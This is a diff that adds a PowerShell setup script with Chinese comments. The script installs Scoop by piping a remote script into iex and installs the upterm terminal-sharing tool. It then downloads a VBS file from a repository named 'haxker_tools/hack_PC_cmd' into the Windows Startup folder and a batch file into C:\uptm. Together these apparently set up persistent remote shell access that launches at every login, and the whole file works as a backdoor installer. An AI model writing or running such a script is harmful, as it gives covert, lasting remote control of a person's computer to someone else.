@@ -1,0 +1,39 @@
+# 設定編碼
+$OutputEncoding = [System.Text.Encoding]::UTF8
+
+# 1. 檢查並安裝 Scoop
+if (Get-Command scoop -ErrorAction SilentlyContinue) {
+    Write-Output "✅ Scoop 已安裝"
+} else {
+    Write-Output "❌ 未安裝，開始安裝 Scoop..."
+    Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
+    iwr -useb https://get.scoop.sh | iex
+}
+
+# 2. 安裝 upterm (如果尚未安裝)
+if (Get-Command upterm -ErrorAction SilentlyContinue) {
+    Write-Output "✅ upterm 已安裝"
+} else {
+    Write-Output "⏳ 正在透過 Scoop 安裝 upterm..."
+    scoop install upterm
+}
+
+# 3. 建立 C:\uptm\ 資料夾
+if (!(Test-Path "C:\uptm")) {
+    Write-Output "📂 正在建立 C:\uptm 資料夾..."
+    New-Item -Path "C:\uptm" -ItemType Directory -Force | Out-Null
+}
+
+# 4. 安裝 auto_host.vbs 到啟動資料夾
+$vbsUrl = "https://github.com/brndan918/haxker_tools/raw/refs/heads/main/hack_PC_cmd/AutoRun/auto_host.vbs"
+$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\auto_host.vbs"
+Write-Output "📥 正在部署 auto_host.vbs..."
+Invoke-WebRequest -Uri $vbsUrl -OutFile $startupPath -UseBasicParsing
+
+# 5. 安裝 host_uptm.bat 到 C:\uptm\
+$batUrl = "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/AutoRun/host_uptm.bat"
+$batPath = "C:\uptm\host_uptm.bat"
+Write-Output "📥 正在部署 host_uptm.bat..."
+Invoke-WebRequest -Uri $batUrl -OutFile $batPath -UseBasicParsing
+
+Write-Output "✨ 所有流程已完成！"
